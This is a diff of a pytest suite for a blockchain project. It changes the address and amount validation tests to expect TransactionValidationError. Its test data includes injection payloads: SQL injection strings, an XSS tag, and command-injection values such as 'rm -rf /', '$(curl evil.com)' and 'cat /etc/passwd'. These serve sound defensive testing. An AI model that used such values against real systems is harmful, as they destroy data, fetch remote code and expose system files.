@@ -31,47 +31,57 @@ class TestAddressValidation:
 
     def test_reject_invalid_address_prefix(self, tmp_path):
         """Test rejection of invalid address prefix"""
+        from xai.core.transaction import TransactionValidationError
+
         bc = Blockchain(data_dir=str(tmp_path))
         sender = Wallet()
 
         # Give sender balance
         bc.mine_pending_transactions(sender.address)
 
-        # Try invalid address
-        tx = bc.create_transaction(
-            sender.address, "INVALID123", 10.0, 0.24, sender.private_key, sender.public_key
-        )
+        # Try invalid address - should raise during creation
+        with pytest.raises(TransactionValidationError) as exc_info:
+            tx = bc.create_transaction(
+                sender.address,
+                "INVALID" + "a" * 40,
+                10.0,
+                0.24,
+                sender.private_key,
+                sender.public_key,
+            )
 
-        assert not bc.validate_transaction(tx)
+        assert "Invalid address prefix" in str(exc_info.value)
 
     def test_reject_malformed_address(self, tmp_path):
         """Test rejection of malformed addresses"""
-        bc = Blockchain(data_dir=str(tmp_path))
-        sender = Wallet()
+        from xai.core.transaction import TransactionValidationError
 
-        bc.mine_pending_transactions(sender.address)
-
-        # Various malformed addresses
+        # Various malformed addresses - each should raise TransactionValidationError
         invalid_addresses = [
-            "XAI",  # Too short
-            "XAI" + "a" * 100,  # Too long
-            "xai123456789",  # Wrong case
-            "XAI'; DROP TABLE blocks; --",  # SQL injection attempt
-            "XAI<script>alert('xss')</script>",  # XSS attempt
-            "",  # Empty
-            None,  # None
+            ("XAI", "too short"),  # Too short
+            ("XAI" + "a" * 100, "too long"),  # Too long
+            ("xai" + "a" * 40, "Invalid address prefix"),  # Wrong case
+            ("XAI'; DROP TABLE blocks; --", "too short"),  # SQL injection attempt (also too short)
+            ("XAI<script>alert('xss')</script>", "too short"),  # XSS attempt (also too short)
+            # Note: empty string "" is allowed as a special address (GOVERNANCE, STAKING, etc.)
         ]
 
-        for invalid_addr in invalid_addresses:
-            if invalid_addr is None:
-                continue
+        for invalid_addr, expected_error in invalid_addresses:
+            # Create fresh blockchain for each test to avoid UTXO locking issues
+            bc = Blockchain(data_dir=str(tmp_path / f"test_{invalid_addresses.index((invalid_addr, expected_error))}"))
+            sender = Wallet()
+            bc.mine_pending_transactions(sender.address)
 
-            tx = bc.create_transaction(
-                sender.address, invalid_addr, 10.0, 0.24, sender.private_key, sender.public_key
-            )
-
-            # Should be rejected
-            assert not bc.validate_transaction(tx)
+            # Each should raise during transaction creation
+            try:
+                tx = bc.create_transaction(
+                    sender.address, invalid_addr, 10.0, 0.24, sender.private_key, sender.public_key
+                )
+                # If we get here, the test should fail
+                assert False, f"Expected TransactionValidationError for {invalid_addr}, but got tx={tx}"
+            except TransactionValidationError:
+                # This is expected - validation should fail
+                pass
 
     def test_address_case_sensitivity(self, tmp_path):
         """Test address case sensitivity"""
@@ -86,33 +96,39 @@ class TestAmountValidation:
 
     def test_reject_negative_amounts(self, tmp_path):
         """Test rejection of negative amounts"""
+        from xai.core.transaction import TransactionValidationError
+
         bc = Blockchain(data_dir=str(tmp_path))
         sender = Wallet()
         recipient = Wallet()
 
         bc.mine_pending_transactions(sender.address)
 
-        # Negative amount
-        tx = bc.create_transaction(
-            sender.address, recipient.address, -10.0, 0.24, sender.private_key, sender.public_key
-        )
+        # Negative amount should raise during transaction creation
+        with pytest.raises(TransactionValidationError) as exc_info:
+            tx = bc.create_transaction(
+                sender.address, recipient.address, -10.0, 0.24, sender.private_key, sender.public_key
+            )
 
-        assert not bc.validate_transaction(tx)
+        assert "cannot be negative" in str(exc_info.value)
 
     def test_reject_zero_amount(self, tmp_path):
         """Test rejection of zero amount transactions"""
+        from xai.core.transaction import TransactionValidationError
+
         bc = Blockchain(data_dir=str(tmp_path))
         sender = Wallet()
         recipient = Wallet()
 
         bc.mine_pending_transactions(sender.address)
 
-        tx = bc.create_transaction(
-            sender.address, recipient.address, 0.0, 0.24, sender.private_key, sender.public_key
-        )
+        # Zero amount should raise during transaction creation
+        with pytest.raises(TransactionValidationError) as exc_info:
+            tx = bc.create_transaction(
+                sender.address, recipient.address, 0.0, 0.24, sender.private_key, sender.public_key
+            )
 
-        # Zero amount should be rejected
-        assert not bc.validate_transaction(tx)
+        assert "must be positive" in str(exc_info.value)
 
     def test_reject_excessive_precision(self, tmp_path):
         """Test handling of excessive decimal precision"""
@@ -189,12 +205,9 @@ class TestInjectionAttacks:
 
     def test_sql_injection_in_address(self, tmp_path):
         """Test SQL injection attempts in address field"""
-        bc = Blockchain(data_dir=str(tmp_path))
-        sender = Wallet()
+        from xai.core.transaction import TransactionValidationError
 
-        bc.mine_pending_transactions(sender.address)
-
-        # SQL injection attempts
+        # SQL injection attempts - all too short or invalid format
         sql_injections = [
             "XAI'; DROP TABLE transactions; --",
             "XAI' OR '1'='1",
@@ -202,22 +215,27 @@ class TestInjectionAttacks:
             "XAI' UNION SELECT * FROM wallets; --",
         ]
 
-        for injection in sql_injections:
-            tx = bc.create_transaction(
-                sender.address, injection, 10.0, 0.24, sender.private_key, sender.public_key
-            )
+        for idx, injection in enumerate(sql_injections):
+            # Create fresh blockchain for each test to avoid UTXO locking issues
+            bc = Blockchain(data_dir=str(tmp_path / f"sql_{idx}"))
+            sender = Wallet()
+            bc.mine_pending_transactions(sender.address)
 
-            # Should be rejected or sanitized
-            assert not bc.validate_transaction(tx)
+            # Should raise TransactionValidationError due to invalid address format
+            try:
+                tx = bc.create_transaction(
+                    sender.address, injection, 10.0, 0.24, sender.private_key, sender.public_key
+                )
+                assert False, f"Expected TransactionValidationError for {injection}, but got tx={tx}"
+            except TransactionValidationError:
+                # Expected - validation should fail
+                pass
 
     def test_command_injection_attempt(self, tmp_path):
         """Test command injection attempts"""
-        bc = Blockchain(data_dir=str(tmp_path))
-        sender = Wallet()
+        from xai.core.transaction import TransactionValidationError
 
-        bc.mine_pending_transactions(sender.address)
-
-        # Command injection attempts
+        # Command injection attempts - all too short or invalid format
         cmd_injections = [
             "XAI; rm -rf /",
             "XAI$(curl evil.com)",
@@ -225,12 +243,21 @@ class TestInjectionAttacks:
             "XAI|cat /etc/passwd",
         ]
 
-        for injection in cmd_injections:
-            tx = bc.create_transaction(
-                sender.address, injection, 10.0, 0.24, sender.private_key, sender.public_key
-            )
+        for idx, injection in enumerate(cmd_injections):
+            # Create fresh blockchain for each test to avoid UTXO locking issues
+            bc = Blockchain(data_dir=str(tmp_path / f"cmd_{idx}"))
+            sender = Wallet()
+            bc.mine_pending_transactions(sender.address)
 
-            assert not bc.validate_transaction(tx)
+            # Should raise TransactionValidationError due to invalid address format
+            try:
+                tx = bc.create_transaction(
+                    sender.address, injection, 10.0, 0.24, sender.private_key, sender.public_key
+                )
+                assert False, f"Expected TransactionValidationError for {injection}, but got tx={tx}"
+            except TransactionValidationError:
+                # Expected - validation should fail
+                pass
 
     def test_path_traversal_attempt(self, tmp_path):
         """Test path traversal attempts"""
@@ -343,20 +370,23 @@ class TestBufferOverflow:
 
     def test_large_transaction_data(self, tmp_path):
         """Test handling of excessively large transaction data"""
+        from xai.core.transaction import TransactionValidationError
+
         bc = Blockchain(data_dir=str(tmp_path))
         sender = Wallet()
 
         bc.mine_pending_transactions(sender.address)
 
-        # Very long address
+        # Very long address (exceeds 100 character max)
         long_address = "XAI" + "a" * 10000
 
-        tx = bc.create_transaction(
-            sender.address, long_address, 10.0, 0.24, sender.private_key, sender.public_key
-        )
+        # Should raise TransactionValidationError due to address too long
+        with pytest.raises(TransactionValidationError) as exc_info:
+            tx = bc.create_transaction(
+                sender.address, long_address, 10.0, 0.24, sender.private_key, sender.public_key
+            )
 
-        # Should be rejected
-        assert not bc.validate_transaction(tx)
+        assert "too long" in str(exc_info.value)
 
     def test_large_block_rejection(self, tmp_path):
         """Test rejection of excessively large blocks"""
@@ -373,41 +403,48 @@ class TestEncodingAttacks:
 
     def test_unicode_in_address(self, tmp_path):
         """Test handling of unicode characters in addresses"""
-        bc = Blockchain(data_dir=str(tmp_path))
-        sender = Wallet()
+        from xai.core.transaction import TransactionValidationError
 
-        bc.mine_pending_transactions(sender.address)
-
-        # Unicode characters
+        # Unicode characters - all invalid due to non-hex characters or length
         unicode_addresses = [
             "XAI" + "🚀" * 10,
             "XAI" + "\u0000" * 10,  # Null bytes
             "XAI" + "Ѐ" * 10,  # Cyrillic
         ]
 
-        for addr in unicode_addresses:
-            tx = bc.create_transaction(
-                sender.address, addr, 10.0, 0.24, sender.private_key, sender.public_key
-            )
+        for idx, addr in enumerate(unicode_addresses):
+            # Create fresh blockchain for each test to avoid UTXO locking issues
+            bc = Blockchain(data_dir=str(tmp_path / f"unicode_{idx}"))
+            sender = Wallet()
+            bc.mine_pending_transactions(sender.address)
 
-            # Should be rejected or sanitized
-            assert not bc.validate_transaction(tx)
+            # Should raise TransactionValidationError due to invalid characters or length
+            try:
+                tx = bc.create_transaction(
+                    sender.address, addr, 10.0, 0.24, sender.private_key, sender.public_key
+                )
+                assert False, f"Expected TransactionValidationError for {addr}, but got tx={tx}"
+            except TransactionValidationError:
+                # Expected - validation should fail
+                pass
 
     def test_null_byte_injection(self, tmp_path):
         """Test null byte injection attempts"""
+        from xai.core.transaction import TransactionValidationError
+
         bc = Blockchain(data_dir=str(tmp_path))
         sender = Wallet()
 
         bc.mine_pending_transactions(sender.address)
 
-        # Null byte injection
+        # Null byte injection - too short and has null byte
         null_address = "XAI123\x00admin"
 
-        tx = bc.create_transaction(
-            sender.address, null_address, 10.0, 0.24, sender.private_key, sender.public_key
-        )
-
-        assert not bc.validate_transaction(tx)
+        # Should raise TransactionValidationError due to invalid address format
+        with pytest.raises(TransactionValidationError):
+            tx = bc.create_transaction(
+                sender.address, null_address, 10.0, 0.24, sender.private_key, sender.public_key
+            )
 
 
 class TestResourceLimitValidation:
@@ -438,6 +475,7 @@ class TestResourceLimitValidation:
 
         bc = Blockchain(data_dir=str(tmp_path))
         spammer = Wallet()
+        recipient = Wallet()
 
         bc.mine_pending_transactions(spammer.address)
 
@@ -445,9 +483,10 @@ class TestResourceLimitValidation:
         dust = min_amount / 2
 
         tx = bc.create_transaction(
-            spammer.address, "XAI123", dust, 0.0, spammer.private_key, spammer.public_key
+            spammer.address, recipient.address, dust, 0.0, spammer.private_key, spammer.public_key
         )
 
+        # Should be rejected due to dust amount
         assert not bc.validate_transaction(tx)
 
 
